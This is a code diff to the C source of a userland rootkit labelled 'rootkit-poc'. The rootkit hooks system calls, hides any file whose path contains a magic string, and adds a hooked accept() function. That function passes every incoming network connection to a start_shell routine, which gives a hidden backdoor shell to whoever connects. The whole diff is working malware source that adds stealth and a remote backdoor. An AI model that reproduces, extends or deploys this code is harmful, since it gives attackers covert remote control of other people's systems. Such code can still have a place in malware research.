@@ -10,9 +10,19 @@
 #include <dirent.h>
 #include <errno.h>
 #include <stdbool.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <utmp.h>
+#include <termios.h>
+#include <sys/ioctl.h>
+#include <signal.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <pty.h>
+#include <unistd.h>
 
-#include "xor.h"
-#include "const.h"
+#include "etc.h"
+#include "shell.h"
 #include "poc.h"
 
 // Set up syscall hooks
@@ -39,12 +49,6 @@ void init(void) {
     poc_is_loaded = 1;
 }
 
-void cleanup(void *var, int len) {
-    DEBUG("[rootkit-poc]: cleanup called %s\n", (char *) var);
-    memset(var, 0x00, len);
-    free(var);
-}
-
 int is_invisible(const char *path) {
     DEBUG("[rootkit-poc]: is_invisible called\n");
 
@@ -55,7 +59,8 @@ int is_invisible(const char *path) {
     xor(config_file);
 
     // Checks if the path contains the MAGIC_STRING
-    if (strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
+    //if (strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
+    if (strstr(path, MAGIC_STRING)) {
         cleanup(config_file, strlen(config_file));
         return 1; // invisible
     }
@@ -227,4 +232,35 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
 //
 //    return (long) syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
 //}
+
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
+    DEBUG("[rootkit-poc]: accept hooked\n");
+
+    if (addrlen == NULL) {
+        fprintf(stderr, "Error: addrlen is NULL before syscall\n");
+        errno = EINVAL;
+        return -1;
+    }
+
+    if (addr == NULL) {
+        fprintf(stderr, "Error: addr is NULL before syscall\n");
+        errno = EINVAL;
+        return -1;
+    }
+
+    int sock = (long) syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);
+
+    if (sock < 0) {
+        perror("accept");
+        return -1;
+    }
+
+    if (addr == NULL) {
+        fprintf(stderr, "Error: addr is NULL after syscall\n");
+        errno = EFAULT;
+        return -1;
+    }
+
+    return start_shell(sock, addr);
+}
 
